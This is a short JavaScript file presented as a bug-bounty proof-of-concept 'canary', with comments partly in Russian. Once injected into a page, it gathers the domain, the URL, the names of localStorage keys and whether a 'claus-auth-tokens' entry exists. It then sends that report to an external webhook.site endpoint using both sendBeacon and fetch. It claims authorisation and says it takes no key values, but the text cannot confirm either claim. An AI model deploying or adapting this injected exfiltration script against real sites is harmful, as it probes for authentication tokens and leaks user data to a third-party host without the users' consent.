// Security canary — bug bounty PoC (researcher: authorized test)
// Доказательство исполнения на origin: document.domain + факт наличия
// auth-ключей в localStorage (ТОЛЬКО имена ключей, без значений).
// Ничего не изменяет, не ворует, сам идентифицируется.
(function () {
  try {
    var BEACON = 'https://webhook.site/bc0623f9-fb1b-498c-b77a-42068c6d997f';
    var report = {
      marker: 'bb-canary-hatahone-exp30',
      domain: document.domain,
      origin: location.origin,
      href: location.href.slice(0, 120),
      ts: new Date().toISOString()
    };
    // какие auth-ключи существуют (имена/булевы, БЕЗ значений)
    var keys = [];
    try {
      for (var i = 0; i < localStorage.length && i < 40; i++) {
        keys.push(localStorage.key(i));
      }
      report.localStorageKeys = keys;
      report.hasClausAuthTokens = !!localStorage.getItem('claus-auth-tokens');
    } catch (e) { report.lsError = String(e).slice(0, 60); }

    console.log('cephe1d bugbounty');
    console.log('[BB-CANARY] executed on', report.domain, report);
    // двойной канал: sendBeacon + no-cors fetch
    try { navigator.sendBeacon && navigator.sendBeacon(BEACON + '/canary-exec', JSON.stringify(report)); } catch (e) {}
    try { fetch(BEACON + '/canary-exec', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(report) }); } catch (e) {}
  } catch (e) {
    try { console.log('[BB-CANARY] error', e); } catch (e2) {}
  }
})();
